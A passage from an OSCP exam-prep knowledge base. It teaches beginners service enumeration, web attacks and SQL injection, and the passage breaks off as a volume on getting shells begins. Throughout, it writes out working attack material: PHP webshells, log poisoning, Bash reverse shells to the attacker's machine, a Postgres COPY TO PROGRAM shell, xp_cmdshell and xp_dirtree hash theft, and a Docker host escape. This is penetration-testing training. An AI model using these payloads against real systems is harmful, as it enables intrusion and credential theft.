#   show dbs ;  use <db> ;  show collections ;  db.users.find()    → dump app users/hashes/tokens (often no auth)
```
**Where it leads:** creds/tokens for the application.

## [ENUM-GIT]  an exposed `.git` folder over HTTP  → `[FOUND-GIT]`
**What it is:** source code + its full history. Repos often contain **hard-coded passwords, API keys, and endpoints** — sometimes in files that were "deleted" but still live in history.
```bash
git-dumper http://$IP/.git ./loot                  # download the whole exposed repo [LOOK-UP] (or: wget -r)
git log -p | grep -iE 'pass|secret|key|token'       # search the ENTIRE history for secrets
git show ; git stash list                           # look at deleted / stashed content
```
**Where it leads:** creds, source to find bugs in, config files with DB/API keys.

## [ENUM-DOCKER]  Ports 2375/2376, or a container you land inside
```bash
docker -H tcp://$IP:2375 ps                                          # is the Docker API exposed with no auth?
docker -H tcp://$IP:2375 run -v /:/host -it alpine chroot /host sh   # if yes → mount the host's disk = host root
# if you're INSIDE a container: check /.dockerenv, your capabilities, mounted host paths, and /var/run/docker.sock → escape
```
**Where it leads:** taking over the host from a container (see `[LINUX-PRIVESC]`, Docker/LXD).

## [ENUM-ORACLE]  Port 1521 — Oracle Database (TNS)
**What it is:** an Oracle database. It's fiddly and has its own tools. The way in is usually: find a valid **SID** (the database's name), then log in with **default creds** (`scott/tiger`, `system/manager`, `sys/change_on_install`), then get command execution.
```bash
sudo apt install oracle-instantclient  # if sqlplus/odat aren't installed
nmap -p1521 -sV --script "oracle-tns-version,oracle-sid-brute" $IP   # version + guess the SID
odat sidguesser -s $IP -p 1521                     # brute-force the SID (the database name)
odat passwordguesser -s $IP -p 1521 -d <SID>       # guess default username/passwords for that SID
tnscmd10g version -h $IP                            # query the TNS listener directly
sqlplus <user>/<pass>@$IP:1521/<SID>               # log in once you have creds
odat utlfile -s $IP -d <SID> -U <user> -P <pass> --putFile C:\\ shell.exe local.exe   # upload a file (→ RCE)
```
**Where it leads:** with creds → file read/write and command execution as the Oracle service account (often high-priv on Windows → SeImpersonate → SYSTEM). Default creds are the usual foothold.

## [ENUM-VNC]  Port 5900(+) — VNC (remote desktop)
**What it is:** a graphical remote-desktop service (like RDP, cross-platform). Some versions have an auth-bypass; weak/blank passwords are common; a found password often unlocks a desktop already logged in as a privileged user.
```bash
nmap -p5900 --script "vnc-info,realvnc-auth-bypass,vnc-title" $IP   # info + CVE-2006-2369 auth bypass check
vncviewer $IP                                       # connect (prompts for the VNC password)
vncviewer $IP -passwd /path/to/vnc.passwd           # use a captured .vnc password file
# crack a captured VNC password file:  vncpwd vnc.passwd   (or the 'vncdec' tools)
hydra -P rockyou.txt vnc://$IP                       # brute the password (last resort)
```
**Where it leads:** a graphical session (often as an already-logged-in, sometimes admin, user).

## [ENUM-IPMI]  Port 623/UDP — IPMI (server management)
**What it is:** a "lights-out" management interface on server hardware. Its big weakness: **IPMI 2.0 will hand you a password hash for any valid user before you even authenticate** (CVE-2013-4786) → crack it offline.
```bash
nmap -sU -p623 --script ipmi-version,ipmi-cipher-zero $IP     # detect + check for the cipher-zero auth bypass
# dump password hashes (Metasploit — your ONE MSF box, or just to grab the hash):
#   use auxiliary/scanner/ipmi/ipmi_dumphashes    → gives a hashcat -m 7300 (RAKP) hash
hashcat -m 7300 ipmi.hash rockyou.txt                # crack the captured RAKP hash
# default creds to try: ADMIN/ADMIN, root/calvin (Dell), admin/admin
```
**Where it leads:** admin creds for the server's management controller (→ often the OS).

## [ENUM-UNUSUAL-PORTS]  a generic method for any port you don't recognise
When you meet an unknown port, work through these:
1. `nc -nv $IP <port>` → grab the banner; try sending a newline, then `HELP`, then `GET / HTTP/1.0`.
2. `nmap -p<port> -sCV --version-intensity 9 $IP` → force harder version detection.
3. Google the banner/version text + "exploit" or "default credentials".
4. Try it as web (`curl`), then as TLS (`openssl s_client -connect $IP:<port>`), then with the service's own client.
5. `searchsploit <product>`. **Treat every listening port as a possible way in.**

---

# [ENUM-DECISION]  "Port X is open → go read this section"
Use your Nmap results, then jump (Ctrl+F the tag):
```
21  FTP        → [ENUM-FTP]      (anonymous? can you upload? version exploit?)
22  SSH        → [ENUM-SSH]      (have creds/keys? otherwise it's a payoff, not a way in)
25  SMTP       → [ENUM-SMTP]     (enumerate usernames)
53  DNS        → [ENUM-DNS]      (zone transfer, AD SRV records)
80/443/8080…   → [WEB-QUICK]     (Volume 2 — always enumerate web fully)
88  KERBEROS   → it's AD! → [AD-QUICK] + [ENUM-KERBEROS]
110/143 POP/IMAP → test creds, loot mailboxes
111 RPC        → showmount → NFS → [ENUM-NFS]
135 MSRPC      → rpcclient user enum → [ENUM-RPC]
139/445 SMB    → [ENUM-SMB] / [SMB-QUICK]
161 SNMP       → snmpwalk → [ENUM-SNMP]
389/636/3268 LDAP → [ENUM-LDAP] + [AD-ENUM]
623 IPMI       → [ENUM-IPMI]  (UDP — dump the hash)
1433 MSSQL     → [ENUM-MSSQL]
1521 Oracle    → [ENUM-ORACLE]
2049 NFS       → [ENUM-NFS]
3306 MySQL     → [ENUM-MYSQL]
3389 RDP       → [ENUM-RDP]
5432 Postgres  → [ENUM-POSTGRES]
5900 VNC       → [ENUM-VNC]
5985/5986 WinRM → [ENUM-WINRM]
6379 Redis     → [ENUM-REDIS]
27017 Mongo    → [ENUM-MONGODB]
2375 Docker    → [ENUM-DOCKER]
anything else  → [ENUM-UNUSUAL-PORTS]
```

---
*End Volume 1. Next: Volume 2 (Web & SQL Injection) — how to break the websites you just found.*


# OSCP+ KNOWLEDGE BASE — VOLUME 2
## BREAKING WEBSITES: WEB ATTACK METHOD + SQL INJECTION (beginner course)

> **Read this box first.**
> Websites are the most common way into a box. This volume has two halves: **(A)** a step-by-step method for exploring and attacking any website, and **(B)** a mini-course on SQL injection (attacking the database behind a website).
>
> **Placeholders:** `$IP` = the target (set it: `export IP=10.10.10.5`). `http://$IP` and `http://target` mean the same thing — the website. `<yourIP>` / `<yourKaliIP>` = **your** attacking machine's IP (find it with `ip addr show tun0`). Whenever you discover a hostname (like `blog.corp.local`), immediately add it to `/etc/hosts` (`sudo nano /etc/hosts` → add `<IP>  blog.corp.local`) or your browser/tools can't reach it.
>
> **Tags** like `[WEB-LFI]` are bookmarks — Ctrl+F to jump. `[LOOK-UP]` = niche, look it up when needed.
>
> **The rule that saves you:** *map the whole site before you attack any single part of it.* Rushing straight to one input is the #1 beginner mistake.

---

# [WEB-QUICK]  first 5 minutes on any web port  (one screen)
```bash
whatweb http://$IP        # identify the tech: web server, CMS (WordPress/Joomla…), frameworks   [MUST-MEMORIZE]
curl -sI http://$IP       # show response headers only (server type, redirects, cookie names)
# then by hand: view page source · read /robots.txt · /sitemap.xml · every .js file · HTML comments

# brute-force hidden folders/files (a "content scan"):
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html
#   -u  = the target URL
#   -w  = the wordlist of names to try (SecLists ships these; install with: sudo apt install seclists)
#   -x  = also try these file extensions on each word (match the site's tech, e.g. php for a PHP site)

ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
#   FUZZ = the placeholder ffuf swaps each wordlist entry into

# if a hostname shows up (a redirect, or in a cert) → brute "virtual hosts":
ffuf -u http://$IP -H "Host: FUZZ.corp.local" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <size>
#   -H "Host: FUZZ..." = change the Host header (many sites serve DIFFERENT pages per hostname)
#   -fs <size>         = "filter out responses of this byte-size" — set it to the default-page size to hide noise

nikto -h http://$IP       # quick automated sweep for common misconfigurations
```
**What to do with the results:**
1. **Identify the stack + version** (e.g. "WordPress 5.8", "Apache 2.4.49") → `searchsploit <that>` to check for ready-made exploits.
2. **Find the interesting inputs** — login forms, upload forms, and URL parameters (`?id=1`) → these are where you inject attacks.
3. **Find hidden directories/vhosts** → repeat this whole scan on each new area you discover.

---

# [WEB-METHODOLOGY]  the order to work in (map, THEN attack)

### 1. [WEB-FINGERPRINT]  — what is this site built with?
- Run `whatweb` and `curl -sI`. Note the `Server`, `X-Powered-By`, and cookie names — they reveal the tech.
- **Get the version of everything** (CMS, framework, web server) → `searchsploit <product> <version>`. A known-vulnerable version is often the whole box.
- HTTPS site? `openssl s_client -connect $IP:443` — the certificate's CN/SAN fields often leak hostnames and virtual hosts.

### 2. [WEB-CONTENT]  — map every page, file, and input
- **Source & JavaScript:** read the page source and every `.js` file for hidden endpoints, API keys, credentials, and developer comments:
  `curl -s http://$IP/app.js | grep -iE 'api|key|token|passw|secret|/admin'`
- **Well-known paths to check:** `/robots.txt`, `/sitemap.xml`, `/.well-known/`, `/.git/`, `/.env`, `/backup`, `/config`.
- **Directory brute-force** (find hidden folders): feroxbuster (auto-recursive) or gobuster/ffuf. Extensions matter — match the stack:
  ```bash
  gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html -t 40
  #   dir      = directory-brute mode
  #   -t 40    = 40 threads (faster)
  gobuster dir -u http://$IP -w <list> -b 403,404 -k    # -b = hide these status codes, -k = ignore TLS cert errors
  ```
- **Files to hunt:** backups (`.bak .old .zip .tar.gz`, `index.php~`), config files (`config.php`, `web.config`, `.env`, `wp-config.php`), and any source-code leaks.
- **Virtual hosts / subdomains:** if any hostname appears, brute the `Host:` header with ffuf and use `-fs` to filter out the default-size response. Add every hit to `/etc/hosts`.
- **Parameters:** note every `?param=value`, hidden form field, and API route. Brute for hidden params:
  `ffuf -u 'http://$IP/page?FUZZ=1' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <size>`
- **Authentication surfaces:** login, register, password-reset, admin panels, upload forms, API auth.

### 3. [WEB-AUTH]  — attack the login/session
- Try **default/weak creds** (`admin/admin`, product defaults, any creds you found elsewhere on the box).
- Look at cookies/sessions: predictable session IDs, a tamperable `role=user` value, or a JWT token (→ `[WEB-JWT]`).
- Try **login SQL injection** (auth bypass, `[SQLI]`), username enumeration (a different error or response time for valid vs invalid users), and password-reset logic flaws.

### 4. [WEB-VULN-SELECT]  — pick the attack based on what the input does
Match the clue to the vulnerability class:
- Your input is **shown back on the page** → XSS or SSTI.
- Your input becomes part of a **file path** → LFI/RFI/path traversal.
- Your input goes into a **database query** → SQL injection.
- Your input is passed to an **OS command** → command injection.
- Your input is a **URL the server fetches** → SSRF.
- The app parses **XML** you send → XXE.
- There's a **file upload** → malicious file upload.
- A cookie/blob looks like a **serialized object** → deserialization.
- `id=` lets you see **another user's data** → IDOR.

---

# WEB VULNERABILITY REFERENCE — how to exploit each one

## [WEB-LFI]  Local File Inclusion — trick the site into reading files off its own disk  → `[FOUND-LFI]`
**What it is:** the site takes a filename from your input and displays that file. If you control the path, you can make it read files it never meant to — passwords, config, SSH keys.
**How to spot it:** a parameter that loads a page or file — `?page=`, `?file=`, `?template=`, `?lang=`, `?include=`.
```bash
?page=/etc/passwd                              # can you read a known Linux file? (proves LFI)
?page=../../../../../../etc/passwd             # "../" climbs up folders ("directory traversal") to reach it
?page=....//....//....//etc/passwd             # bypass a filter that strips a single "../"
?page=/etc/passwd%00                           # null byte cuts off an appended ".php" (very old PHP only)
?page=..\..\..\..\windows\win.ini             # Windows version of the same idea

# READ THE SITE'S OWN SOURCE CODE (to find DB creds or the real bug):
?page=php://filter/convert.base64-encode/resource=index.php   # returns the file base64-encoded → decode it locally

# TURN LFI INTO COMMAND EXECUTION:
?page=data://text/plain;base64,<base64-of-php-code>           # if the server allows remote includes
# "log poisoning": first set your browser's User-Agent to  <?php system($_GET['c']);?>  then:
?page=/var/log/apache2/access.log&c=id                        # the log now contains your PHP → it runs
# other useful files: /var/log/auth.log (SSH), /proc/self/environ, /var/mail/<user>, the PHP session file
```
> **What is a "webshell"?** A tiny script (like `<?php system($_GET['c']); ?>`) that, once on the server, lets you run OS commands by visiting a URL (`?c=whoami`). Getting one onto the box is a common goal.

**Grab these:** `/etc/passwd` (user list), the app's config (DB creds), `/home/*/.ssh/id_rsa` (SSH key), `web.config`, `wp-config.php`.
**No log to poison?** Use the **PHP filter-chain** trick to get code execution from pure LFI → `[PARITY3-LFI-FILTERCHAIN]`.
**If it fails:** use the base64 filter to read the source and find the *real* vuln; change how many `../` you use; if `.php` is auto-appended, use `php://filter` or a null byte.
**Where it leads:** creds → spray them · code execution → `[SHELL-QUICK]`.

## [WEB-RFI]  Remote File Inclusion — make the site load YOUR file
**What it is:** like LFI, but the site fetches a file from a URL you give — so you host a webshell on your machine and point it there. Rarer (needs `allow_url_include=On`).
```bash
# 1) On Kali, save a PHP webshell as shell.txt, then serve the folder: python3 -m http.server 80
?page=http://<yourKaliIP>/shell.txt    # site downloads and runs YOUR shell; watch your server for the hit
```
**Where it leads:** code execution → reverse shell.

## [WEB-CMDINJ]  Command Injection — your input reaches the OS shell  → `[FOUND-CMDINJ]`
**What it is:** a feature runs a system tool (ping, nslookup, image/PDF conversion, backup) and sticks your input into the command. Add your own command and it runs too.
**How to spot it:** any feature that clearly runs a program (a "ping this host" box, a converter, etc.).
```bash
; id      | id      & id      && id      `id`     $(id)     %0aid    # separators — try each to chain your command
127.0.0.1; id        127.0.0.1 && whoami          # example: inside a "ping" field
; sleep 5                                          # BLIND test: if the reply takes 5s longer, it worked
; curl http://<yourKaliIP>/x                       # BLIND out-of-band: watch your http server for the request
; bash -c 'bash -i >& /dev/tcp/<yourKaliIP>/443 0>&1'   # get a reverse shell (URL-ENCODE the whole payload!)
& powershell -e <base64>                           # Windows target
```
> **"Blind"** means you don't see the command's output on the page. You confirm it worked indirectly — by a time delay (`sleep 5`) or by making the server contact you (`curl http://you`).

**Getting past filters:** spaces blocked → use `${IFS}` or `<` · characters blocked → `echo <base64>|base64 -d|bash` · quotes in the way → close them first: `"; id;#`.
**Troubleshoot:** URL-encode special characters (`;`=`%3B`, space=`%20`, newline=`%0a`); try every separator.
**Where it leads:** `[SHELL-QUICK]` → stabilise the shell → `[LINUX-PRIVESC]`.

## [WEB-SSRF]  Server-Side Request Forgery — make the server fetch URLs for you
**What it is:** the server fetches a URL you supply. You abuse it to reach things *you* can't — internal-only services, or cloud metadata that holds credentials.
**How to spot it:** a parameter that takes a URL — `url=`, `redirect=`, a webhook field, "fetch from URL", "image from URL".
```bash
?url=http://<yourKaliIP>/                          # confirm it actually fetches (your server gets a hit)
?url=http://127.0.0.1:<port>/                       # reach a service only listening on the server's localhost
?url=http://169.254.169.254/latest/meta-data/       # cloud metadata endpoint → often leaks credentials
# file:// reads local files; gopher:// can talk to internal services (advanced)
```
**Where it leads:** discover internal services (then attack them); cloud metadata → creds.

## [WEB-SSTI]  Server-Side Template Injection — inject into the page-templating engine
**What it is:** many apps build pages from templates. If your input is fed into the template engine unsanitised, you can run code on the server.
**How to spot it:** your input is rendered back *after* server processing (profile names, email templates, error messages).
```bash
${7*7}   {{7*7}}   <%= 7*7 %>   #{7*7}     # if the page prints 49, the engine evaluated it → SSTI
# identify the engine, then use its code-execution gadget:
# Jinja2 (Python):
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
# Twig (PHP):
{{ ['id']|filter('system') }}
# Freemarker (Java):
<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
```
**If it fails:** confirm *which* engine it is first (different syntax); watch for a sandbox; try another gadget.
**Where it leads:** code execution → reverse shell.

## [WEB-XXE]  XML External Entity — abuse an XML parser to read files
**What it is:** if the app parses XML you send, you can define an "entity" that pulls in a local file and echoes it back.
**How to spot it:** the app accepts XML — SOAP APIs, `.xml` uploads, SAML, `Content-Type: application/xml`, even DOCX/SVG (they're XML inside).
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>   <!-- define entity x = contents of /etc/passwd -->
<root><name>&x;</name></root>                            <!-- &x; gets replaced by the file's contents -->
```
**Variations:** blind/out-of-band (use an external DTD to exfiltrate data), SSRF via XXE, PHP `expect://` for RCE, base64 filter to read source.
**Where it leads:** file read → creds/keys → foothold.

## [WEB-UPLOAD]  Malicious File Upload  → `[FOUND-UPLOAD]`
**What it is:** an upload form (avatar, document, image). Goal: upload an executable script (webshell) into a folder the web server will *run*, then visit it.
**How to spot it:** any upload feature.
```bash
# 1) Upload shell.php containing:   <?php system($_GET['c']); ?>
#    Find where it landed (brute /uploads /images), then visit:  http://$IP/uploads/shell.php?c=id
# 2) If .php is blocked, try alternative executable extensions:
shell.php3   shell.php5   shell.phtml   shell.pht   shell.phar
shell.php.jpg    shell.pHp    shell.php%00.jpg           # double extension / mixed case / null byte
# Other filter bypasses: set Content-Type: image/png (but PHP in the body); prepend GIF89a magic bytes;
#   upload a .htaccess to make the server treat a new extension as PHP
# IIS servers → try .asp/.aspx/.config ;  Tomcat → .jsp, or deploy a .war
```
**Troubleshoot:** find the served path (brute `/uploads/`, check the response's Location header); confirm it *executes* with a test `<?php echo 7*7;?>` (should print 49, not the raw text).
**Where it leads:** webshell → reverse shell → `[LINUX-PRIVESC-QUICK]` / `[WINDOWS-PRIVESC-QUICK]`.

## [WEB-DESERIALIZE]  Insecure Deserialization
**What it is:** apps sometimes store objects as encoded blobs (in cookies/params) and rebuild ("deserialize") them on the server. A crafted blob can trick the server into running code.
**How to spot it:** blob-like cookies/params — PHP `O:8:"..."`, Java `rO0AB` (or hex `AC ED 00 05`), .NET `AAEAAAD…`, Python pickle.
**Exploit:** PHP → craft an object / "POP chain" (needs the source); Java → `ysoserial`; .NET → `ysoserial.net`; PHP gadget chains → `phpggc` (`[PARITY2-WEB-EXTRA]`).
**If it fails:** get the source first (via LFI/git). ⚠️ Usually a **rabbit hole without source** → see `[COMMON-RABBIT-HOLES web]`.
**Where it leads:** code execution → shell.

## [WEB-IDOR]  Insecure Direct Object Reference — access data that isn't yours
**What it is:** the app uses guessable IDs (`?id=123`, `/user/5`) and forgets to check you're allowed to see them. Change the number → see someone else's data.
**How to spot it:** sequential IDs in URLs or requests.
**Test:** change the ID; visit admin-only routes directly; flip a `role`/`isAdmin` field in the request.
**Where it leads:** other users' / admin data → creds, or privileged features (upload/exec).

## [WEB-JWT]  JSON Web Tokens — forge your own login token
**What it is:** a JWT is a signed token proving who you are (`header.payload.signature`, three base64 chunks joined by dots). If the signing secret is weak or checking is broken, you can forge an admin token.
**How to spot it:** `Authorization: Bearer eyJ...`, or a cookie with three base64 parts split by dots.
```bash
hashcat -m 16500 jwt.txt rockyou.txt   # crack a weak signing secret → then re-sign the token with role=admin
python3 jwt_tool.py <JWT> -T           # interactive tamper/forge tool   [PARITY2-WEB-EXTRA]
```
**Common attacks:** `alg:none` (drop the signature), weak HMAC secret (crack + re-sign), `kid`/`jku` injection, RS256→HS256 confusion (sign with the public key as the HMAC secret).
**Where it leads:** forged admin token → privileged access.

## [WEB-AUTHBYPASS]  ways to get past a login
SQLi auth bypass (`[SQLI]`) · default/weak creds · password-reset token flaws · "forced browsing" straight to an authenticated page · cookie/`role` tampering · JWT forging (`[WEB-JWT]`) · HTTP verb tampering · 403-bypass tricks (`[WEB-403-BYPASS]`) · 2FA bypass.

## [WEB-XSS]  Cross-Site Scripting  (rarely the OSCP path — just recognise it)
Reflected/stored/DOM XSS runs your JavaScript in a victim's browser. **Low value on OSCP** because there's usually no real victim to attack — unless the box simulates an admin who visits pages. Test with `<script>alert(1)</script>`; only useful for session theft/CSRF when a victim exists.

## [COMMON-RABBIT-HOLES web]  — where beginners waste hours
- Endless directory-brute with giant wordlists → use a *medium* list, go recursive, then move on.
- Chasing XSS on a box with no victim.
- Deserialization/XXE without the source code → get source first, or skip.
- Fuzzing one parameter forever → map the *whole* app instead.
- Chasing a CVE that needs a login you don't have.

---

# [SQLI]  SQL INJECTION — attacking the database (mini-course)

> **What is SQL injection?** Websites store data in a database and ask it questions using SQL. If the site drops your input straight into that question, you can rewrite the question — to log in without a password, or to dump every user's password hash. This section teaches it from scratch.

## [SQLI-QUICK]  the core moves  (one screen)
```sql
DETECT:   type a single quote  '  (or ")  → does the page error or behave differently? then it may be injectable
          confirm:  ' OR 1=1-- -   (always true)   vs   ' AND 1=2-- -   (always false)
COUNT:    ' ORDER BY 1-- -   then 2, 3, …   → keep going until it errors = number of columns
UNION:    ' UNION SELECT 1,2,3-- -          → see which numbers print on the page (those are your "output slots")
IDENTIFY: put version()/@@version into a printing slot → learn which database it is
BLIND:    page changes for  ' AND 1=1-- -  but not  ' AND 1=2-- -   → "boolean blind"
          nothing shows but  ' AND SLEEP(5)-- -  delays the reply → "time blind"
LOGIN BYPASS:  put   ' OR 1=1-- -   in the username field
```
> **`-- -`** is a SQL comment — it tells the database to ignore the rest of the original query (the trailing space after `--` matters). MySQL also accepts `#`.

## [SQLI-DECISION-TREE]  which technique do I use?
```
1. Injectable?  Type '  → error or changed page = yes.
2. Does the page SHOW query results or errors?
   YES, results show   → count columns (ORDER BY) → UNION SELECT → read data directly   (fastest)
   YES, error text shows → error-based extraction (data leaks inside the error message)
   NO output, but page changes on true/false → BOOLEAN blind (extract one character at a time)
   NO change at all      → TIME-based blind (use SLEEP/WAITFOR to read data by delay)
3. Identify the database (MySQL? MSSQL? Postgres?) → use THAT database's syntax below.
4. Enumerate: list databases → tables → columns → dump the creds.
5. Escalate: can you read/write files or run OS commands? (depends on the database)
```

## [SQLI-DETECT]  proving it's injectable
- Break the query: `'`, `"`, `)`, `';`. Watch for a SQL error, a 500, a blank page, or different content.
- Confirm you control the logic: `' AND 1=1-- -` (page normal) vs `' AND 1=2-- -` (page changes/empties) → injectable and controllable.
- Numeric fields (no quotes needed): `1 AND 1=1` vs `1 AND 1=2`.
- Comment styles to try: `-- -` (note the trailing space), `#` (MySQL), `/*...*/`, `;--`.
- **Login bypass:** username `admin'-- -` (logs in as admin, ignoring the password check) or `' OR 1=1 LIMIT 1-- -`.

## [SQLI-UNION]  union-based extraction (when results are shown)
1. **Count the columns:** `' ORDER BY 1-- -`, then `2`, `3`… until it errors. The last number that worked = the column count. (Alternative: `' UNION SELECT NULL-- -`, add `NULL`s until no error.)
2. **Find the printing columns:** `' UNION SELECT 1,2,3-- -` → note which numbers actually appear on the page. Those slots are where your stolen data will show.
3. **Identify the database:** put `@@version` / `version()` into a printing slot.
4. **Extract data:** replace a printing number with your data query (see the per-database sections).
- **Data types don't match / errors?** Use `NULL` for columns you're not using, or wrap values in a cast-to-text.

## [SQLI-BLIND]  boolean & time-based (when nothing is shown)
- **Boolean blind:** ask true/false questions and read the answer from whether the page changes. Example — is the first letter of the password an 'a'?
  `' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -` → page "true" or "false". Repeat for each character. **Automate this** (a short Python script).
- **Time blind:** same idea, but the "yes" is a delay:
  `' AND IF(1=1,SLEEP(5),0)-- -` (MySQL) · `'; IF(1=1) WAITFOR DELAY '0:0:5'-- -` (MSSQL) · `' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -` (Postgres).
- Blind is painfully slow by hand → sqlmap would automate it, **but sqlmap is BANNED on the exam** (`[SQLI-SQLMAP]`). Write a small script to loop the characters instead.

---

## [SQLI-MYSQL]  MySQL / MariaDB
- **Identify:** `@@version` / `version()`; comment `#`; `database()`, `current_user()`; errors say "You have an error in your SQL syntax".
- **Count columns:** `' ORDER BY N-- -` or `' UNION SELECT NULL,NULL-- -`.
- **Enumerate** (MySQL keeps a catalogue of its own structure in `information_schema`):
```sql
-- list databases:
' UNION SELECT schema_name,2 FROM information_schema.schemata-- -
-- list tables in the current database:
' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
-- list columns in the 'users' table:
' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
-- dump usernames:passwords (0x3a is a ':' separator):
' UNION SELECT concat(user,0x3a,password),2 FROM users-- -
```
(Wrap in `group_concat(...)` to pull many rows into one cell.)
- **File read/write (RCE):** with the `FILE` privilege → read `' UNION SELECT LOAD_FILE('/etc/passwd'),2-- -`; write a webshell `... INTO OUTFILE '/var/www/html/sh.php'` (needs `secure_file_priv` empty and a writable path). UDF RCE if the plugin dir is writable `[LOOK-UP]`.
- **Creds:** dump the app's `users` table → hashes → crack with `hashcat` or reuse.

## [SQLI-MSSQL]  Microsoft SQL Server  → also `[ENUM-MSSQL]`
- **Identify:** `@@version`, `SELECT @@servername`; comment `--`; string join is `+`; `WAITFOR DELAY` exists.
- **Enumerate:**
```sql
' UNION SELECT name,2 FROM master..sysdatabases-- -                                   -- databases
' UNION SELECT table_name,2 FROM information_schema.tables-- -                          -- tables
' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -  -- columns
' UNION SELECT @@version,2-- -                                                          -- version
```
- **Error-based (when UNION won't show):** `' AND 1=CONVERT(int,(SELECT @@version))-- -` — the data leaks inside the type-conversion error.
- **Command execution (the payoff)** — turn on `xp_cmdshell` and run OS commands:
```sql
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
'; EXEC xp_cmdshell 'whoami';-- -
```
- **Steal a hash:** `'; EXEC xp_dirtree '\\<yourKaliIP>\x';-- -` → catch it on Responder. Stacked queries (`;`) usually work here.
- Impersonation / linked servers → lateral movement (see `[ENUM-MSSQL]`).

## [SQLI-POSTGRES]  PostgreSQL  → also `[ENUM-POSTGRES]`
- **Identify:** `version()`; string join is `||`; comment `--`; cast errors mention "pg".
- **Enumerate:**
```sql
' UNION SELECT table_name,2 FROM information_schema.tables-- -
' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
```
- **Command execution:** `COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<yourKaliIP>/443 0>&1"';` (needs superuser, v9.3+). **File read:** `CREATE TABLE t(x text); COPY t FROM '/etc/passwd'; SELECT x FROM t;`.
- **Time blind:** `' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -`.

## [SQLI-SQLITE]  SQLite
- **Identify:** `sqlite_version()`; there's no `information_schema`.
- **Enumerate:**
```sql
' UNION SELECT name,2 FROM sqlite_master WHERE type='table'-- -                       -- tables
' UNION SELECT sql,2 FROM sqlite_master WHERE type='table' AND name='users'-- -        -- table's schema
```
- No `xp_cmdshell`; RCE only via an ATTACH-write-to-webroot in specific apps `[LOOK-UP]`. Mostly used to dump creds.

## [SQLI-SQLMAP]  (⛔ BANNED on the exam — practice/learning only)
```bash
sqlmap -r req.txt --batch                     # feed it a saved Burp request (best accuracy)
sqlmap -u 'http://$IP/p?id=1' --batch --dbs   # auto-detect + list databases
sqlmap -u '...' -D appdb --tables ; --dump -T users
sqlmap -r req.txt --os-shell                   # try for a shell if file/exec is possible
```
Useful flags: `--level 5 --risk 3` (dig deeper), `--technique=BEUST`, `--tamper=space2comment` (evade a filter), `-p param`, `--threads 5`.
**⛔ EXAM RULE:** sqlmap is an *automatic-exploitation* tool and is **banned** (`[EXAM-RULES-2026]`). Use it only in **practice** to learn what manual injection should look like. On the exam, do **all** SQLi by hand using the sections above.

## [SQLI-TROUBLESHOOTING]
| What you see | Meaning / fix |
|---|---|
| No error, no change | maybe not injectable, or fully blind → try time-based |
| UNION: "different number of columns" | wrong column count → recount with ORDER BY |
| UNION runs but no data shows | your data landed in a non-printing column → move it to a printing slot; cast to text |
| Quotes are filtered | use `CHAR()` or `0x` hex encoding, or a numeric field |
| Spaces are filtered | `/**/`, `%09` (tab), `+`, or parentheses |
| Keywords filtered (a WAF) | change case, or inline comments: `UNI/**/ON` |
| `-- -` doesn't work | try `#`, `-- ` (space), `/*...*/`, or `;%00` |
| Works in Burp but not the browser | it's URL-encoding — encode the payload; use Burp Repeater |

**If SQLi fails entirely:** double-check the input really goes to a database (it might be LFI or command injection instead); test other parameters; check the POST body, headers, and cookies for injection too.
**After SQLi:** dump creds → `[FOUND-CREDS]` and spray them; MSSQL/Postgres → RCE → `[SHELL-QUICK]`; MySQL FILE priv → webshell.

---
*End Volume 2. Next: Volume 3 — turning a bug into a real shell, moving files, and cracking the credentials you find.*


# OSCP+ KNOWLEDGE BASE — VOLUME 3
## GETTING A SHELL · MOVING FILES · CRACKING PASSWORDS · FINDING EXPLOITS

> **Read this box first.**
> By now you've found a bug or some creds. This volume turns that into a real, working command shell on the target, shows how to move files back and forth, and how to crack any passwords/hashes you loot.
>
> **Two machines, two IPs — keep them straight:**
> - **Your Kali** — the attacker. Its exam IP is on the VPN interface `tun0`. Find it: `ip addr show tun0`. In commands this is `<yourKaliIP>`, `<IP>`, `LHOST`, or `<yourVPN-IP>`. **This is almost always the one beginners get wrong.**
> - **The target** — the victim. That's `$IP` (set it: `export IP=10.10.10.5`).
>
> **Key words defined once:**
> - **Shell** = a command prompt on the target that YOU control.
> - **Reverse shell** = the target connects OUT to you (you run a "listener"; the target's shell dials home). This is the usual approach because outbound connections get through firewalls more easily.
> - **Listener** = a program on your Kali (`nc -lvnp 443`) waiting to catch that incoming connection.
> - **LHOST / LPORT** = the Listener's HOST (your Kali IP) and PORT (e.g. 443). "L" = *your* side.

---

# [FOOTHOLD-CHECKLIST]  getting your first shell (a "foothold")

## [QUICK]  order of attempts — cheapest and easiest first
```
1. Default creds     (product docs, admin:admin, or creds you already found)
2. Weak creds        (Company1!, Welcome1, Summer2025!, the product name, username==password)
3. Credential reuse  (EVERY cred you found → try on EVERY service and EVERY user)
4. Anonymous access  (FTP/SMB/NFS/LDAP/Redis/Mongo that need no login)
5. Known-version RCE (searchsploit / CVE — must match the version exactly)
6. Web vulnerability (upload > command injection > SQLi-to-RCE > LFI-to-RCE > SSTI)
7. Service misconfig (MSSQL xp_cmdshell, Redis file write, Postgres COPY, MySQL FILE)
8. Password spray/brute (only with a real user list + a reason; last resort — can lock accounts)
```

## [PRACTICAL]  pick your way in based on what you have
